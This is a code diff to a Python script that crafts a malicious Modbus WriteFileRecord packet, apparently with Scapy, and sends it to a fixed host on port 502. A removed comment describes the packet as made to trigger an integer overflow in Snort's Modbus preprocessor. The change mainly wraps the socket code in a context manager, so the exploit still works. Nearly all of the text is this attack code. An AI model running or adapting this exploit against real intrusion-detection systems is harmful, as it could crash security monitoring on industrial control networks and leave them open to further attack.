@@ -8,7 +8,6 @@ logging.basicConfig(level=logging.DEBUG)
 def send_malicious_modbus_request():
     try:
         # Crafting a malicious Modbus request to exploit the vulnerability
-        # This packet is designed to cause an integer overflow in Snort's Modbus preprocessor[^1^][1]
         modbus_request = ModbusADURequest(transId=1, protoId=0, len=6, unitId=1) / ModbusPDUWriteFileRecordRequest(
             referenceType=6,
             fileNumber=0,
@@ -19,21 +18,20 @@ def send_malicious_modbus_request():
         request_data = bytes(modbus_request)
         
         # Using socket to send the request
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect(('10.103.152.8', 502))
-        logging.info("Connected to server.")
-        
-        s.send(request_data)
-        logging.debug('Sent malicious Modbus request: %s', repr(request_data))
-        
-        response = s.recv(1024)
-        logging.debug('Received response: %s', repr(response))
-        
-        modbus_response = ModbusADUResponse(response)
-        logging.info("Modbus response: %s", modbus_response.show(dump=True))
-        
-        s.close()
-        logging.info("Connection closed.")
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.connect(('10.103.152.8', 502))
+            logging.info("Connected to server.")
+            
+            s.send(request_data)
+            logging.debug('Sent malicious Modbus request: %s', repr(request_data))
+            
+            response = s.recv(1024)
+            logging.debug('Received response: %s', repr(response))
+            
+            modbus_response = ModbusADUResponse(response)
+            logging.info("Modbus response: %s", modbus_response.show(dump=True))
+            
+            logging.info("Connection closed.")
     except Exception as e:
         logging.error("Error in client communication: %s", e)
 
